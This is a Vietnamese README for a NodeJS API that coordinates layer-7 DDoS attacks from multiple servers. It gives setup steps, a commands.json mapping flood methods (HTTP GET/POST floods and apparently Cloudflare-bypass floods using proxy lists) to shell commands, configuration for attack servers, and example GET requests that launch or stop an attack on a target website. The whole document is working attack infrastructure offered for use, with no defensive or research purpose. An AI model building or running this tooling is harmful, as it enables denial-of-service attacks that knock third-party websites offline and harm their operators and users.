<h2>API NodeJS cho các cuộc tấn công layer 7</h2>

<h4>API này rất an toàn và nhanh gấp đôi thời gian ping giữa API và chương trình phụ trợ</h4>
<h4>tức là ping 60 mili giây, sẽ chỉ mất 120 mili giây để khởi chạy cuộc tấn công</h4>


<h1>Cài đặt:</h1>

```sh
curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
sudo apt -y install nodejs
npm i express
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "alpha": {
        "name": "alpha",
        "ip": "1.1.1.1",
        "port": 3000
    },
    "beta": {
        "name": "beta",
        "ip": "2.2.2.2",
        "port": 3000
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
    "CFS": "screen -dmS attack_${attack_id} node CFS.js ${host} ${time} ${thread} ${method} proxy.txt ${rq}",
    "CF-TLS": "screen -dmS attack_${attack_id} node CF-TLS.js ${host} ${time} ${thread} proxy.txt",
    "STOP": "screen -dm pkill -f ${host}"
}
```

<h3>Update api.js:</h3><br>

```js
const api_port = 8888; //API Port
const socket_token = "SOCKET_TOKEN"; // Mã thông báo TCP Socket, sử dụng số/chữ cái ngẫu nhiên
const api_key = "API_KEY"; // your API Key
const domain_lock = false; // khóa api để chỉ được sử dụng từ một tên miền cụ thể
const api_domain = 'example.com'; // miền API của bạn (nếu domain_lock được đặt thành true)
```

<h3>Update socket.js:</h3><br>

```js
const socket_port = 3000;
const socket_token = "SOCKET_TOKEN";
const allowed_ips = ['1.1.1.1'];
```

## Sau đó, tải `socket.js` lên máy chủ tấn công và tải `api.js` `servers.json` và `commands.json` lên máy chủ API


### Proxy đảo ngược

Bạn nên tạo proxy ngược bằng Nginx để sử dụng API của mình:

```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api/attack {
        proxy_pass http://backend:3000/api/attack;
    }
}
```

Thay thế `'http://backend:3000/api/attack'` bằng URL máy chủ API của bạn

### Sử dụng API

Gửi yêu cầu GET tới API bằng các trường bắt buộc

GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=HTTPGET&server=alpha`

Bạn có thể đặt `&server=all` để khởi chạy tới tất cả các máy chủ

Bạn có thể ngăn chặn các cuộc tấn công bằng cách gửi yêu cầu GET tới API sử dụng `&method=stop`

GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=stop&server=alpha`

